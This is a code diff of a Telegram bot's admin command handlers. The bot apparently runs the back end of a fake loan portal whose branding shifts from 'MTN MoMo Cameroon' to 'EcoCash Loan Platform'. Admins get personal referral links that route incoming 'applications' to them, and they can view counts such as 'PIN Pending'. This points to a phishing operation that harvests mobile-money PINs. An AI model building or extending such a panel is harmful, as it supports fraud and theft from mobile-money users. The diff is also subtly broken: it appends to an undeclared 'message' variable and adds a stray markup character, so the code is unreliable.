@@ -182,109 +182,77 @@ function setupCommandHandlers() {
 
             if (isSuperAdmin) {
                 const text = `
-👋 *Welcome Super Admin!*
-
-*Your Admin ID:* \`ADMIN001\`
-*Role:* ⭐ Super Admin
-*Your Personal Link:*
-${WEBHOOK_URL}?admin=ADMIN001
-
-*Commands:*
-/mylink - Get your portal link
-/stats - View global statistics
-/pending - Pending applications
-/myinfo - Your information
-
-*Super Admin Management:*
-/addadmin - Add new auto-generated admin
-/addadminid <id> - Add admin with specific ID
-/transferadmin <oldChatId> | <newChatId> - Transfer admin Chat ID
-/pauseadmin <adminId> - Pause an admin
-/unpauseadmin <adminId> - Unpause an admin
-/removeadmin <adminId> - Remove an admin
-/admins - List all registered admins
-/suspendall - 🔒 Suspend all admin links
-
-*Messaging:*
-/send <adminId> <message> - Direct message an admin
-/broadcast <message> - Broadcast to all admins
-/ask <adminId> <request> - Send action request
-                `.trim();
-
-                const inline_keyboard = [
-                    [
-                        { text: '📊 Global Stats', callback_data: 'sa_stats' },
-                        { text: '⏳ Pending Apps', callback_data: 'sa_pending' }
-                    ],
-                    [
-                        { text: '👥 List Admins', callback_data: 'sa_admins' },
-                        { text: '➕ Add Admin', callback_data: 'sa_addadmin' }
-                    ],
-                    [
-                        { text: '🔒 Suspend All', callback_data: 'sa_suspendall' },
-                        { text: '🔗 My Link', callback_data: 'sa_mylink' }
-                    ]
-                ];
-
-                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
-
-            } else {
-                const text = `
-👋 *Welcome Admin!*
+👋 *Welcome ${admin.name}!*
 
 *Your Admin ID:* \`${adminId}\`
-*Role:* 👤 Admin
+*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
 *Your Personal Link:*
 ${WEBHOOK_URL}?admin=${adminId}
 
 *Commands:*
-/mylink - Get your portal link
-/stats - View your statistics
+/mylink - Get your link
+/stats - Your statistics
 /pending - Pending applications
-/myinfo - Your account information
-                `.trim();
+/myinfo - Your information
+`;
+                if (isSuperAdmin) {
+                    message += `
+*Admin Management (Super Admin Only):*
+/addadmin - Add new admin
+/addadminid - Add admin with specific ID
+/transferadmin oldChatId | newChatId - Transfer admin
+/pauseadmin <adminId> - Pause an admin
+/unpauseadmin <adminId> - Unpause an admin
+/removeadmin <adminId> - Remove an admin
+/admins - List all admins
 
-                const inline_keyboard = [
-                    [
-                        { text: '📊 My Stats', callback_data: 'admin_stats' },
-                        { text: '⏳ Pending Apps', callback_data: 'admin_pending' }
-                    ],
-                    [
-                        { text: '🔗 My Link', callback_data: 'admin_mylink' },
-                        { text: '👤 My Info', callback_data: 'admin_myinfo' }
-                    ]
-                ];
+*Messaging:*
+/send <adminId> <message> - Message an admin
+/broadcast <message> - Message all admins
+/ask <adminId> <request> - Send action request
+`;
+                }
+                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+            } else {
+                await bot.sendMessage(chatId, `
+👋 *Welcome to EcoCash Loan Platform!*
 
-                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
+Your Chat ID: \`${chatId}\`
+
+Provide this to your super admin to get access.
+                `, { parse_mode: 'Markdown' });
             }
-
-        } else {
-            bot.sendMessage(chatId, `
-👋 *Welcome to MTN MoMo Cameroon*
-Your Telegram Chat ID: \`${chatId}\`
-
-⚠️ *Note:* You are not registered as an Admin. Contact Super Admin (\`ADMIN001\`) with your Chat ID to get access.
-            `.trim(), { parse_mode: 'Markdown' });
+        } catch (error) {
+            console.error('❌ Error in /start:', error);
         }
     });
 
-    // --- /mylink ---
+    // /mylink
     bot.onText(/\/mylink/, async (msg) => {
-        const chatId = msg.chat.id;
+        const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId || !isAdminActive(chatId)) return;
-        bot.sendMessage(chatId, `🔗 *Your Personal Portal Link:*\n${WEBHOOK_URL}?admin=${adminId}`, { parse_mode: 'Markdown' });
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+        const admin = await db.getAdmin(adminId);
+        bot.sendMessage(chatId, `
+🔗 *YOUR LINK*
+
+\`${WEBHOOK_URL}?admin=${adminId}\`
+
+📋 Applications → *${admin.name}*
+        `, { parse_mode: 'Markdown' });
     });
 
-    // --- /stats ---
+    // /stats
     bot.onText(/\/stats/, async (msg) => {
-        const chatId = msg.chat.id;
+        const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId || !isAdminActive(chatId)) return;
-
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
         const stats = await db.getAdminStats(adminId);
         bot.sendMessage(chatId, `
-📊 *STATISTICS (${adminId})*
+📊 *STATISTICS*
+(${adminId})*
 ----------------------------------
 📋 Total Applications: \`${stats.total || 0}\`
 ⏳ PIN Pending: \`${stats.pinPending || 0}\`
